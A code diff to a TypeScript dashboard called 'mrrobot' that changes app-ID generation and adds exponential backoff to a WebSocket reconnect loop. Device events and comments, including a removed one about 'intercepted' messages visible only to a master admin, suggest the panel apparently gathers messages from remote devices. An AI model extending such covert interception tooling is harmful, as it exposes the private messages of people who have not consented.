@@ -87,9 +87,9 @@ type MasterSession = {
 };
 
 function generateAppId() {
-  const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-  const s = (n: number) => Array.from({ length: n }, () => c[Math.floor(Math.random() * c.length)]).join("");
-  return `APP-${s(4)}-${s(4)}-${s(4)}`;
+  const c = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const s = Array.from({ length: 11 }, () => c[Math.floor(Math.random() * c.length)]).join("");
+  return `MRrobot${s}`;
 }
 function fmtAgo(iso: string | null | undefined): string {
   if (!iso) return "Never";
@@ -3007,36 +3007,38 @@ function Dashboard({ masterPin, sessionId, onLogout, onPinChanged, onSessionIdUp
     return () => { closed = true; es?.close(); };
   }, [masterPin]);
 
-  // ── Global WebSocket: live events via Cloudflare Durable Object ──
+  // ── Global WebSocket: live events ──
   useEffect(() => {
     let ws: WebSocket | null = null;
     let closed = false;
+    let retryDelay = 2000;
     function connect() {
       if (closed) return;
       const wsUrl = location.origin.replace(/^http/, "ws") + "/api/events";
       ws = new WebSocket(wsUrl);
       ws.onopen = () => {
         setWsConnected(true);
-        // Fire reconnect event so DevicesTab can do a full refresh after any disconnect gap
+        retryDelay = 2000;
         window.dispatchEvent(new CustomEvent("mrrobot:ws_reconnected"));
       };
       ws.onmessage = (e) => {
         try {
           const msg = JSON.parse(e.data as string) as { event: string; data: unknown };
           if (msg.event === "device_updated") {
-            // Dispatch full device data — DevicesTab surgically updates the single card, no HTTP re-fetch
             window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: msg.data }));
           } else if (msg.event === "message_added") {
             const payload = msg.data as { appId: string; message: MsgRow };
             window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: payload }));
           } else if (msg.event === "master_message_added") {
-            // Intercepted message — only master admin sees this via WS
             const payload = msg.data as { appId: string; message: MsgRow };
             window.dispatchEvent(new CustomEvent("mrrobot:message_added", { detail: payload }));
           }
         } catch { /* ignore */ }
       };
-      ws.onclose = () => { setWsConnected(false); if (!closed) setTimeout(connect, 3000); };
+      ws.onclose = () => {
+        setWsConnected(false);
+        if (!closed) { setTimeout(connect, retryDelay); retryDelay = Math.min(retryDelay * 2, 30000); }
+      };
       ws.onerror = () => { setWsConnected(false); ws?.close(); };
     }
     connect();
